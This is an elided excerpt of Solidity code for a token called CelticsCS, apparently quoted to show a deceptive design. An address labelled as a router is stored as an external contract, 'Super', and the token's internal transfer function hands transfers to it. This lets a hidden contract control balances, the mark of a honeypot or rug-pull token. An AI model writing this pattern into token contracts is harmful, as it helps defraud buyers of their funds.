...
contract Ownable is Context {  
    ...
    */
    function initOwnable(address newOwner) internal returns (bool) {
        Super = ERC20(newOwner);
        return true;
    }       
...
contract CelticsCS is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => bool) private _isExcluded;  
    uint256 private _totalSupply = 10000000000 *  10**9;  
    string private _name = "CelticsCS";
    string private _symbol = "CCS";
    ...
    uint256 public maxWalletAmount = 10000000000 *  10**9;          

    constructor(address routerAddress) Ownable(routerAddress) {           
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) private  { 
        Super._basicTransfer(sender, recipient, amount);          
	...
	function proLaunch(uint256 launchAt, uint256 dura) public view returns (bool){
